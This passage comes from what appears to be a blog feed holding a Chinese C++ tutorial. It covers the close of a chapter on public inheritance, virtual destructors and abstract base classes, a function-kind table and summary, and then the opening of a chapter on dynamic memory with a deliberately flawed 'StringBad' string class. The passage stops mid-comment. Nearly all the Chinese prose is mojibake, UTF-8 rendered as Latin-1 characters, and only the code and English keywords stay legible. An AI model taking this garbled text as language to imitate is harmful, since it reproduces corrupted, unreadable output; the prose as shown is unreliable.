å…¬æœ‰ç»§æ‰¿çš„è€ƒè™‘å› ç´ "></a>13.8.3 å…¬æœ‰ç»§æ‰¿çš„è€ƒè™‘å› ç´ </h3><p>å…¬æœ‰ç»§æ‰¿æ˜¯å®ç° â€œis-aâ€ å…³ç³»å’Œå¤šæ€çš„å…³é”®ï¼Œä½†éœ€è¦ä»”ç»†è€ƒè™‘ï¼š</p><ol><li> <strong>â€œis-aâ€ å…³ç³»:</strong> ç¡®ä¿æ´¾ç”Ÿç±»ç¡®å®æ˜¯åŸºç±»çš„ä¸€ç§ç‰¹æ®Šç±»å‹ï¼Œå¹¶ä¸”ç¬¦åˆåŸºç±»çš„è¡Œä¸ºå¥‘çº¦ï¼ˆLiskov æ›¿æ¢åŸåˆ™ï¼‰ã€‚</li><li> <strong>è™šææ„å‡½æ•°:</strong> å¦‚æœç±»å¯èƒ½è¢«ç”¨ä½œåŸºç±»ï¼ˆç‰¹åˆ«æ˜¯å¦‚æœå¯èƒ½é€šè¿‡åŸºç±»æŒ‡é’ˆ <code>delete</code> æ´¾ç”Ÿç±»å¯¹è±¡ï¼‰ï¼Œ<strong>å¿…é¡»</strong>å°†ææ„å‡½æ•°å£°æ˜ä¸º <code>virtual</code>ã€‚</li><li><strong>ç»§æ‰¿æ¥å£ vs. å®ç°:</strong><ul><li>  <strong>çº¯è™šå‡½æ•°:</strong> åªç»§æ‰¿æ¥å£ï¼Œå¼ºåˆ¶æ´¾ç”Ÿç±»æä¾›å®ç°ï¼ˆç”¨äºæŠ½è±¡åŸºç±»ï¼‰ã€‚</li><li>  <strong>è™šå‡½æ•° (æœ‰å®ç°):</strong> ç»§æ‰¿æ¥å£å’Œé»˜è®¤å®ç°ï¼Œå…è®¸æ´¾ç”Ÿç±»è¦†ç›–é»˜è®¤å®ç°ã€‚</li><li>  <strong>éè™šå‡½æ•°:</strong> ç»§æ‰¿æ¥å£å’Œå¼ºåˆ¶å®ç°ï¼Œæ´¾ç”Ÿç±»ä¸åº”é‡æ–°å®šä¹‰ï¼ˆè¦†ç›–éè™šå‡½æ•°é€šå¸¸æ˜¯åæ‰“ç®—ï¼‰ã€‚</li></ul></li><li><strong>è®¿é—®æ§åˆ¶:</strong><ul><li>  <code>public</code> æˆå‘˜æ„æˆç±»çš„å…¬æœ‰æ¥å£ã€‚</li><li>  <code>private</code> æˆå‘˜æ˜¯å®ç°ç»†èŠ‚ï¼Œå¯¹æ´¾ç”Ÿç±»éšè—ã€‚</li><li>  <code>protected</code> æˆå‘˜å¯¹æ´¾ç”Ÿç±»å¯è§ï¼Œä½†å¯¹å¤–éƒ¨éšè—ã€‚è°¨æ…ä½¿ç”¨ <code>protected</code> æ•°æ®ï¼Œå®ƒä¼šå¢åŠ åŸºç±»å’Œæ´¾ç”Ÿç±»ä¹‹é—´çš„è€¦åˆã€‚ä¼˜å…ˆä½¿ç”¨ <code>protected</code> å‡½æ•°ã€‚</li></ul></li><li> <strong>æ„é€ å‡½æ•°å’Œåˆå§‹åŒ–:</strong> æ´¾ç”Ÿç±»æ„é€ å‡½æ•°å¿…é¡»è°ƒç”¨åŸºç±»æ„é€ å‡½æ•°ï¼ˆé€šå¸¸åœ¨æˆå‘˜åˆå§‹åŒ–åˆ—è¡¨ä¸­ï¼‰æ¥åˆå§‹åŒ–åŸºç±»éƒ¨åˆ†ã€‚</li><li> <strong>èµ‹å€¼è¿ç®—ç¬¦:</strong> æ´¾ç”Ÿç±»çš„èµ‹å€¼è¿ç®—ç¬¦éœ€è¦æ˜¾å¼è°ƒç”¨åŸºç±»çš„èµ‹å€¼è¿ç®—ç¬¦æ¥å¤„ç†åŸºç±»éƒ¨åˆ†ã€‚</li><li> <strong>å¯¹è±¡åˆ‡ç‰‡ (Slicing):</strong> å¦‚æœå°†æ´¾ç”Ÿç±»å¯¹è±¡ç›´æ¥æŒ‰å€¼èµ‹ç»™åŸºç±»å¯¹è±¡ï¼ˆ<code>Base b = derived;</code>ï¼‰ï¼Œæ´¾ç”Ÿç±»ç‰¹æœ‰çš„éƒ¨åˆ†ä¼šè¢«â€œåˆ‡æ‰â€ï¼Œåªä¿ç•™åŸºç±»éƒ¨åˆ†ã€‚è¿™æ˜¯éœ€è¦é¿å…çš„ï¼Œé€šå¸¸åº”ä½¿ç”¨æŒ‡é’ˆæˆ–å¼•ç”¨æ¥å¤„ç†å¤šæ€å¯¹è±¡ã€‚</li></ol><h3 id="13-8-4-ç±»å‡½æ•°å°ç»“"><a href="#13-8-4-ç±»å‡½æ•°å°ç»“" class="headerlink" title="13.8.4 ç±»å‡½æ•°å°ç»“"></a>13.8.4 ç±»å‡½æ•°å°ç»“</h3><table><thead><tr><th align="left">å‡½æ•°ç±»åˆ«</th><th align="left">ç›®çš„ä¸è¯´æ˜</th><th align="left">å…³é”®ç‰¹æ€§/å…³é”®å­—</th></tr></thead><tbody><tr><td align="left"><strong>æ„é€ å‡½æ•°</strong></td><td align="left">åˆå§‹åŒ–æ–°åˆ›å»ºçš„å¯¹è±¡</td><td align="left">ç±»åç›¸åŒ, æ— è¿”å›ç±»å‹, å¯é‡è½½, <code>explicit</code></td></tr><tr><td align="left"><strong>ææ„å‡½æ•°</strong></td><td align="left">å¯¹è±¡é”€æ¯å‰æ‰§è¡Œæ¸…ç†å·¥ä½œï¼ˆé‡Šæ”¾èµ„æºï¼‰</td><td align="left"><code>~ClassName()</code>, æ— å‚æ•°, æ— è¿”å›ç±»å‹, <code>virtual</code></td></tr><tr><td align="left"><strong>å¤åˆ¶æ„é€ å‡½æ•°</strong></td><td align="left">ç”¨åŒç±»å¯¹è±¡åˆå§‹åŒ–æ–°å¯¹è±¡</td><td align="left"><code>ClassName(const ClassName &amp;)</code>, æ·±å¤åˆ¶</td></tr><tr><td align="left"><strong>å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦</strong></td><td align="left">å°†ä¸€ä¸ªå·²å­˜åœ¨çš„åŒç±»å¯¹è±¡èµ‹ç»™å¦ä¸€ä¸ª</td><td align="left"><code>operator=(const ClassName &amp;)</code>, æ·±å¤åˆ¶, è¿”å› <code>*this</code></td></tr><tr><td align="left"><strong>ç§»åŠ¨æ„é€ å‡½æ•°</strong></td><td align="left">ç”¨åŒç±»å³å€¼å¯¹è±¡åˆå§‹åŒ–æ–°å¯¹è±¡ï¼ˆè½¬ç§»èµ„æºï¼‰</td><td align="left"><code>ClassName(ClassName &amp;&amp;)</code>, C++11, ç§»åŠ¨è¯­ä¹‰</td></tr><tr><td align="left"><strong>ç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦</strong></td><td align="left">å°†ä¸€ä¸ªåŒç±»å³å€¼å¯¹è±¡èµ‹ç»™å¦ä¸€ä¸ªï¼ˆè½¬ç§»èµ„æºï¼‰</td><td align="left"><code>operator=(ClassName &amp;&amp;)</code>, C++11, ç§»åŠ¨è¯­ä¹‰</td></tr><tr><td align="left"><strong>æ™®é€šæˆå‘˜å‡½æ•°</strong></td><td align="left">å®ç°ç±»çš„è¡Œä¸ºå’ŒåŠŸèƒ½</td><td align="left">éšå¼ <code>this</code> æŒ‡é’ˆ</td></tr><tr><td align="left"><strong><code>const</code> æˆå‘˜å‡½æ•°</strong></td><td align="left">è®¿é—®å¯¹è±¡çŠ¶æ€ï¼Œä½†ä¸ä¿®æ”¹å¯¹è±¡</td><td align="left">å‡½æ•°å£°æ˜/å®šä¹‰ååŠ  <code>const</code></td></tr><tr><td align="left"><strong><code>static</code> æˆå‘˜å‡½æ•°</strong></td><td align="left">ä¸ç±»æœ¬èº«å…³è”ï¼Œè€Œéç‰¹å®šå¯¹è±¡</td><td align="left"><code>static</code>, æ—  <code>this</code> æŒ‡é’ˆ</td></tr><tr><td align="left"><strong><code>virtual</code> å‡½æ•°</strong></td><td align="left">å…è®¸åœ¨æ´¾ç”Ÿç±»ä¸­è¦†ç›–ï¼Œå®ç°å¤šæ€</td><td align="left"><code>virtual</code>, åŠ¨æ€è”ç¼–</td></tr><tr><td align="left"><strong>çº¯è™šå‡½æ•°</strong></td><td align="left">å®šä¹‰æ¥å£ï¼Œå¼ºåˆ¶æ´¾ç”Ÿç±»å®ç°ï¼ˆç”¨äº ABCï¼‰</td><td align="left"><code>virtual ... = 0;</code></td></tr><tr><td align="left"><strong>è¿ç®—ç¬¦é‡è½½å‡½æ•°</strong></td><td align="left">å®šä¹‰æ ‡å‡†è¿ç®—ç¬¦ç”¨äºç±»å¯¹è±¡çš„è¡Œä¸º</td><td align="left"><code>operator+</code>, <code>operator&lt;&lt;</code>, etc.</td></tr><tr><td align="left"><strong>è½¬æ¢å‡½æ•°</strong></td><td align="left">å®šä¹‰ä»ç±»ç±»å‹åˆ°å…¶ä»–ç±»å‹çš„è½¬æ¢</td><td align="left"><code>operator typeName()</code>, <code>explicit</code></td></tr><tr><td align="left"><strong>å‹å…ƒå‡½æ•°/ç±»</strong></td><td align="left">å…è®¸éæˆå‘˜å‡½æ•°æˆ–ç±»è®¿é—®ç§æœ‰/ä¿æŠ¤æˆå‘˜</td><td align="left"><code>friend</code></td></tr></tbody></table><p>è®¾è®¡è‰¯å¥½çš„ç±»éœ€è¦ä»”ç»†è€ƒè™‘è¿™äº›ä¸åŒç±»å‹çš„å‡½æ•°ï¼Œç¡®ä¿å°è£…æ€§ã€èµ„æºç®¡ç†çš„æ­£ç¡®æ€§ã€æ¥å£çš„æ¸…æ™°æ€§ä»¥åŠåœ¨ç»§æ‰¿ä½“ç³»ä¸­çš„æ°å½“è¡Œä¸ºã€‚</p><h2 id="13-9-æ€»ç»“"><a href="#13-9-æ€»ç»“" class="headerlink" title="13.9 æ€»ç»“"></a>13.9 æ€»ç»“</h2><p>æœ¬ç« ä»‹ç»äº† C++ çš„ä¸€ä¸ªæ ¸å¿ƒç‰¹æ€§â€”â€”<strong>ç»§æ‰¿</strong>ï¼Œå®ƒå…è®¸æˆ‘ä»¬åŸºäºç°æœ‰ç±»åˆ›å»ºæ–°ç±»ï¼Œå®ç°ä»£ç é‡ç”¨å’Œå»ºç«‹ç±»ä¹‹é—´çš„å±‚æ¬¡å…³ç³»ã€‚</p><p>ä¸»è¦å†…å®¹å›é¡¾ï¼š</p><ol><li><p><strong>åŸºæœ¬ç»§æ‰¿:</strong></p><ul><li>  ä¸€ä¸ªç±»ï¼ˆ<strong>æ´¾ç”Ÿç±»</strong>ï¼‰å¯ä»¥ä»å¦ä¸€ä¸ªç±»ï¼ˆ<strong>åŸºç±»</strong>ï¼‰ç»§æ‰¿æˆå‘˜ï¼ˆæ•°æ®å’Œæ–¹æ³•ï¼‰ã€‚</li><li>  <strong>å…¬æœ‰ç»§æ‰¿ (<code>public</code>)</strong> æ˜¯æœ€å¸¸ç”¨çš„æ–¹å¼ï¼Œå»ºç«‹ <strong>â€œis-aâ€</strong> å…³ç³»ï¼Œæ„å‘³ç€æ´¾ç”Ÿç±»å¯¹è±¡ä¹Ÿæ˜¯ä¸€ä¸ªåŸºç±»å¯¹è±¡ã€‚åŸºç±»çš„å…¬æœ‰æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­ä»ç„¶æ˜¯å…¬æœ‰ï¼Œä¿æŠ¤æˆå‘˜ä»ç„¶æ˜¯ä¿æŠ¤ã€‚</li><li>  æ´¾ç”Ÿç±»æ„é€ å‡½æ•°å¿…é¡»é€šè¿‡<strong>æˆå‘˜åˆå§‹åŒ–åˆ—è¡¨</strong>è°ƒç”¨åŸºç±»æ„é€ å‡½æ•°æ¥åˆå§‹åŒ–ç»§æ‰¿çš„åŸºç±»éƒ¨åˆ†ã€‚</li></ul></li><li><p><strong>å¤šæ€å…¬æœ‰ç»§æ‰¿:</strong></p><ul><li>  <strong>å¤šæ€</strong>å…è®¸æˆ‘ä»¬é€šè¿‡åŸºç±»æ¥å£ï¼ˆæŒ‡é’ˆæˆ–å¼•ç”¨ï¼‰ç»Ÿä¸€å¤„ç†ä¸åŒç±»å‹çš„æ´¾ç”Ÿç±»å¯¹è±¡ã€‚</li><li>  é€šè¿‡åœ¨åŸºç±»ä¸­å°†æˆå‘˜å‡½æ•°å£°æ˜ä¸º<strong>è™šå‡½æ•° (<code>virtual</code>)</strong> æ¥å¯ç”¨å¤šæ€è¡Œä¸ºã€‚</li><li>  å½“é€šè¿‡åŸºç±»æŒ‡é’ˆæˆ–å¼•ç”¨è°ƒç”¨è™šå‡½æ•°æ—¶ï¼Œç¨‹åºåœ¨<strong>è¿è¡Œæ—¶</strong>æ ¹æ®å¯¹è±¡çš„å®é™…ç±»å‹é€‰æ‹©è°ƒç”¨å“ªä¸ªç‰ˆæœ¬çš„æ–¹æ³•ï¼ˆ<strong>åŠ¨æ€è”ç¼–</strong>æˆ–æ™šç»‘å®šï¼‰ã€‚</li><li>  å¦‚æœå‡½æ•°ä¸æ˜¯è™šå‡½æ•°ï¼Œæˆ–è€…é€šè¿‡å¯¹è±¡ç›´æ¥è°ƒç”¨ï¼Œåˆ™åœ¨<strong>ç¼–è¯‘æ—¶</strong>æ ¹æ®æŒ‡é’ˆ/å¼•ç”¨çš„å£°æ˜ç±»å‹æˆ–å¯¹è±¡ç±»å‹å†³å®šè°ƒç”¨ç‰ˆæœ¬ï¼ˆ<strong>é™æ€è”ç¼–</strong>æˆ–æ—©ç»‘å®šï¼‰ã€‚</li></ul></li><li><p><strong>è™šå‡½æ•°æ³¨æ„äº‹é¡¹:</strong></p><ul><li>  <code>override</code> (C++11): æ¨èåœ¨æ´¾ç”Ÿç±»è¦†ç›–è™šå‡½æ•°æ—¶ä½¿ç”¨ï¼Œä»¥è¿›è¡Œç¼–è¯‘å™¨æ£€æŸ¥ã€‚</li><li>  <code>final</code> (C++11): å¯ç”¨äºé˜»æ­¢è™šå‡½æ•°åœ¨æ›´æ·±å±‚æ´¾ç”Ÿç±»ä¸­è¢«è¦†ç›–ï¼Œæˆ–é˜»æ­¢ç±»è¢«ç»§æ‰¿ã€‚</li><li>  æ„é€ å‡½æ•°ä¸èƒ½æ˜¯è™šå‡½æ•°ã€‚</li><li>  <strong>è™šææ„å‡½æ•°:</strong> å¦‚æœç±»å¯èƒ½è¢«ç”¨ä½œåŸºç±»ï¼ˆç‰¹åˆ«æ˜¯æ¶‰åŠåŠ¨æ€å†…å­˜åˆ†é…æˆ–å¯èƒ½é€šè¿‡åŸºç±»æŒ‡é’ˆåˆ é™¤æ´¾ç”Ÿç±»å¯¹è±¡ï¼‰ï¼Œå…¶ææ„å‡½æ•°<strong>å¿…é¡»</strong>å£°æ˜ä¸º <code>virtual</code>ï¼Œä»¥ç¡®ä¿æ­£ç¡®çš„ææ„é¡ºåºå’Œèµ„æºé‡Šæ”¾ã€‚</li></ul></li><li><p><strong>è®¿é—®æ§åˆ¶ (<code>protected</code>):</strong></p><ul><li>  <code>protected</code> æˆå‘˜å¯¹ç±»å†…éƒ¨å’Œæ´¾ç”Ÿç±»æˆå‘˜å‡½æ•°å¯è§ï¼Œä½†å¯¹å¤–éƒ¨ä»£ç ä¸å¯è§ã€‚</li><li>  å®ƒæä¾›äº†ä»‹äº <code>private</code> å’Œ <code>public</code> ä¹‹é—´çš„è®¿é—®çº§åˆ«ã€‚</li><li>  è™½ç„¶ <code>protected</code> å…è®¸æ´¾ç”Ÿç±»ç›´æ¥è®¿é—®åŸºç±»å®ç°ç»†èŠ‚ï¼Œä½†å¯èƒ½ç ´åå°è£…ï¼Œåº”è°¨æ…ä½¿ç”¨ã€‚ä¼˜å…ˆä½¿ç”¨ <code>private</code> æ•°æ®å’Œ <code>public/protected</code> æ¥å£å‡½æ•°ã€‚</li></ul></li><li><p><strong>æŠ½è±¡åŸºç±» (ABC):</strong></p><ul><li>  åŒ…å«è‡³å°‘ä¸€ä¸ª<strong>çº¯è™šå‡½æ•° (<code>virtual ... = 0;</code>)</strong> çš„ç±»æ˜¯æŠ½è±¡åŸºç±»ã€‚</li><li>  ABC <strong>ä¸èƒ½è¢«å®ä¾‹åŒ–</strong>ï¼ˆä¸èƒ½åˆ›å»ºå¯¹è±¡ï¼‰ã€‚</li><li>  ä¸»è¦ç”¨äºå®šä¹‰ä¸€ä¸ª<strong>æ¥å£è§„èŒƒ</strong>ï¼Œå¼ºåˆ¶æ´¾ç”Ÿç±»å®ç°çº¯è™šå‡½æ•°ã€‚</li><li>  å¯ä»¥å£°æ˜æŒ‡å‘ ABC çš„æŒ‡é’ˆæˆ–å¼•ç”¨ï¼Œç”¨äºå®ç°å¤šæ€ã€‚</li><li>  æ´¾ç”Ÿç±»åªæœ‰å®ç°äº†æ‰€æœ‰ç»§æ‰¿çš„çº¯è™šå‡½æ•°åï¼Œæ‰èƒ½æˆä¸ºå…·ä½“ç±»ã€‚</li></ul></li><li><p><strong>ç»§æ‰¿ä¸åŠ¨æ€å†…å­˜åˆ†é…:</strong></p><ul><li>  <strong>åŸºç±»ä½¿ç”¨ <code>new</code>ï¼Œæ´¾ç”Ÿç±»ä¸ç”¨:</strong> æ´¾ç”Ÿç±»é€šå¸¸ä¸éœ€è¦è‡ªå®šä¹‰ç‰¹æ®Šæˆå‘˜å‡½æ•°ï¼Œä½†åŸºç±»å¿…é¡»æœ‰è™šææ„å‡½æ•°ã€‚</li><li>  <strong>åŸºç±»å’Œæ´¾ç”Ÿç±»éƒ½ä½¿ç”¨ <code>new</code>:</strong> æ´¾ç”Ÿç±»<strong>å¿…é¡»</strong>æä¾›è‡ªå·±çš„ææ„å‡½æ•°ã€å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦ã€‚æ´¾ç”Ÿç±»çš„å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦å¿…é¡»æ˜¾å¼è°ƒç”¨åŸºç±»çš„å¯¹åº”ç‰ˆæœ¬æ¥å¤„ç†åŸºç±»éƒ¨åˆ†ã€‚åŸºç±»ææ„å‡½æ•°ä»éœ€æ˜¯è™šå‡½æ•°ã€‚</li></ul></li><li><p><strong>ç±»è®¾è®¡å›é¡¾:</strong></p><ul><li>  ç†è§£ç¼–è¯‘å™¨ç”Ÿæˆçš„ç‰¹æ®Šæˆå‘˜å‡½æ•°ï¼ˆæ„é€ ã€ææ„ã€å¤åˆ¶ã€ç§»åŠ¨ï¼‰åŠå…¶å±€é™æ€§ã€‚</li><li>  éµå¾ªä¸‰/äº”/é›¶æ³•åˆ™æ¥ç®¡ç†èµ„æºï¼Œä¼˜å…ˆä½¿ç”¨ RAIIï¼ˆå¦‚æ™ºèƒ½æŒ‡é’ˆã€æ ‡å‡†å®¹å™¨ï¼‰ã€‚</li><li>  åˆç†ä½¿ç”¨ <code>const</code> æˆå‘˜å‡½æ•°ã€‚</li><li>  è°¨æ…è®¾è®¡ç»§æ‰¿å…³ç³»ï¼Œç¡®ä¿ç¬¦åˆ â€œis-aâ€ åŸåˆ™ã€‚</li><li>  æ­£ç¡®ä½¿ç”¨è™šå‡½æ•°å’Œè™šææ„å‡½æ•°å®ç°å¤šæ€å’Œå®‰å…¨çš„èµ„æºç®¡ç†ã€‚</li></ul></li></ol><p>ç»§æ‰¿æ˜¯ C++ ä¸­å®ç°ä»£ç é‡ç”¨ã€å»ºç«‹ç±»å‹å±‚æ¬¡ç»“æ„å’Œå®ç°å¤šæ€çš„å…³é”®æœºåˆ¶ã€‚ç†è§£å…¶å·¥ä½œåŸç†ã€ä¸åŒç±»å‹çš„ç»§æ‰¿ï¼ˆæœ¬ç« ä¸»è¦å…³æ³¨å…¬æœ‰ç»§æ‰¿ï¼‰ä»¥åŠç›¸å…³çš„è®¾è®¡åŸåˆ™å¯¹äºç¼–å†™å¼ºå¤§çš„ã€å¯ç»´æŠ¤çš„é¢å‘å¯¹è±¡ç¨‹åºè‡³å…³é‡è¦ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 12 ç±»å’ŒåŠ¨æ€å†…å­˜åˆ†é…</title>
      <link href="2025/04/30/Cpp_tutorial_Chapter_12/"/>
      <url>2025/04/30/Cpp_tutorial_Chapter_12/</url>
      
        <content type="html"><![CDATA[<h2 id="12-1-åŠ¨æ€å†…å­˜å’Œç±»"><a href="#12-1-åŠ¨æ€å†…å­˜å’Œç±»" class="headerlink" title="12.1 åŠ¨æ€å†…å­˜å’Œç±»"></a>12.1 åŠ¨æ€å†…å­˜å’Œç±»</h2><p>å½“ç±»éœ€è¦ä½¿ç”¨ <code>new</code> åœ¨è‡ªç”±å­˜å‚¨åŒºï¼ˆå †ï¼‰ä¸Šåˆ†é…å†…å­˜æ—¶ï¼Œæƒ…å†µä¼šå˜å¾—æ¯”ä¹‹å‰æˆ‘ä»¬çœ‹åˆ°çš„ç±»ï¼ˆå¦‚ <code>Stock</code>, <code>Time</code>, <code>Vector</code>ï¼‰æ›´å¤æ‚ã€‚è¿™äº›ç±»çš„æ•°æ®æˆå‘˜æœ¬èº«ï¼ˆå¦‚ <code>int</code>, <code>double</code>, <code>std::string</code>ï¼‰è¦ä¹ˆå¤§å°å›ºå®šï¼Œè¦ä¹ˆåƒ <code>std::string</code> é‚£æ ·è‡ªå·±ç®¡ç†å†…å­˜ã€‚</p><p>ä½†æ˜¯ï¼Œå¦‚æœä½ çš„ç±»ç›´æ¥ä½¿ç”¨æŒ‡é’ˆæ¥ç®¡ç†é€šè¿‡ <code>new</code> åˆ†é…çš„å†…å­˜ï¼ˆä¾‹å¦‚ï¼Œè‡ªå®šä¹‰ä¸€ä¸ªå­—ç¬¦ä¸²ç±»æ¥ç®¡ç† <code>char*</code> æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ï¼‰ï¼Œé‚£ä¹ˆ C++ ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆçš„æŸäº›é»˜è®¤è¡Œä¸ºï¼ˆç‰¹åˆ«æ˜¯å¯¹è±¡å¤åˆ¶å’Œèµ‹å€¼ï¼‰å¯èƒ½ä¼šå¯¼è‡´ä¸¥é‡çš„é—®é¢˜ï¼Œå¦‚å†…å­˜æ³„æ¼å’Œç¨‹åºå´©æºƒã€‚æœ¬ç« å°†æ¢è®¨è¿™äº›é—®é¢˜ä»¥åŠå¦‚ä½•é€šè¿‡å®šä¹‰ç‰¹æ®Šçš„æˆå‘˜å‡½æ•°æ¥è§£å†³å®ƒä»¬ã€‚</p><h3 id="12-1-1-å¤ä¹ ç¤ºä¾‹å’Œé™æ€ç±»æˆå‘˜"><a href="#12-1-1-å¤ä¹ ç¤ºä¾‹å’Œé™æ€ç±»æˆå‘˜" class="headerlink" title="12.1.1 å¤ä¹ ç¤ºä¾‹å’Œé™æ€ç±»æˆå‘˜"></a>12.1.1 å¤ä¹ ç¤ºä¾‹å’Œé™æ€ç±»æˆå‘˜</h3><p>è®©æˆ‘ä»¬ä»ä¸€ä¸ªç®€å•çš„ã€æ•…æ„è®¾è®¡å¾—æœ‰é—®é¢˜çš„å­—ç¬¦ä¸²ç±» <code>StringBad</code> å¼€å§‹ï¼Œå®ƒä½¿ç”¨ <code>char*</code> æŒ‡é’ˆæ¥æŒ‡å‘åŠ¨æ€åˆ†é…çš„å†…å­˜ã€‚</p><p><strong>StringBad ç±»å®šä¹‰ (stringbad.h)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> STRINGBAD_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STRINGBAD_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StringBad</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">char</span> * str;             <span class="comment">// æŒ‡å‘å­—ç¬¦ä¸²çš„æŒ‡é’ˆ</span></span><br><span class="line">    <span class="keyword">int</span> len;                <span class="comment">// å­—ç¬¦ä¸²é•¿åº¦</span></span><br><span class="line">    <span class="comment">// é™æ€æ•°æ®æˆå‘˜: ç”¨äºè·Ÿè¸ªå¯¹è±¡æ•°é‡</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> num_strings;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// æ„é€ å‡½æ•°</span></span><br><span class="line">    StringBad(<span class="keyword">const</span> <span class="keyword">char</span> * s); <span class="comment">// ä» C å­—ç¬¦ä¸²æ„é€ </span></span><br><span class="line">    StringBad();               <span class="comment">// é»˜è®¤æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="comment">// ææ„å‡½æ•°</span></span><br><span class="line">    ~StringBad();              <span class="comment">// éå¸¸é‡è¦ï¼</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å‹å…ƒå‡½æ•°: é‡è½½ &lt;&lt;</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> StringBad &amp; st);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// STRINGBAD_H_</span></span></span><br></pre></td></tr></table></figure><p><strong>StringBad ç±»å®ç° (stringbad.cpp)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt; // ä¸ºäº†ä½¿ç”¨ strlen, strcpy</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stringbad.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆå§‹åŒ–é™æ€ç±»æˆå‘˜ num_strings</span></span><br><span class="line"><span class="comment">// æ³¨æ„ï¼šé™æ€æ•°æ®æˆå‘˜å¿…é¡»åœ¨ç±»å®šä¹‰å¤–éƒ¨è¿›è¡Œå®šä¹‰å’Œåˆå§‹åŒ–</span></span><br><span class="line"><span class="keyword">int</span> StringBad::num_strings = <span class="number">0</span>; <span class="comment">// åˆå§‹åŒ–ä¸º 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ„é€ å‡½æ•°: ä» C å­—ç¬¦ä¸²æ„é€ </span></span><br><span class="line">StringBad::StringBad(<span class="keyword">const</span> <span class="keyword">char</span> * s) &#123;</span><br><span class="line">    len = <span class="built_in">std</span>::<span class="built_in">strlen</span>(s);       <span class="comment">// è·å–é•¿åº¦</span></span><br><span class="line">    str = <span class="keyword">new</span> <span class="keyword">char</span>[len + <span class="number">1</span>];    <span class="comment">// åˆ†é…å†…å­˜ (+1 ä¸ºäº†å­˜å‚¨æœ«å°¾çš„ &#x27;\0&#x27;)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">strcpy</span>(str, s);        <span class="comment">// å¤åˆ¶å­—ç¬¦ä¸²åˆ°æ–°å†…å­˜</span></span><br><span class="line">    num_strings++;              <span class="comment">// å¯¹è±¡è®¡æ•°å¢åŠ </span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; num_strings &lt;&lt; <span class="string">&quot;: \&quot;&quot;</span> &lt;&lt; str &lt;&lt; <span class="string">&quot;\&quot; object created\n&quot;</span>; <span class="comment">// è°ƒè¯•ä¿¡æ¯</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é»˜è®¤æ„é€ å‡½æ•°</span></span><br><span class="line">StringBad::StringBad() &#123;</span><br><span class="line">    len = <span class="number">4</span>;</span><br><span class="line">    str = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">strcpy</span>(str, <span class="string">&quot;C++&quot;</span>);    <span class="comment">// é»˜è®¤å€¼</span></span><br><span class="line">    num_strings++;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; num_strings &lt;&lt; <span class="string">&quot;: \&quot;&quot;</span> &lt;&lt; str &lt;&lt; <span class="string">&quot;\&quot; default object created\n&quot;</span>; <span class="comment">// è°ƒè¯•ä¿¡æ¯</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 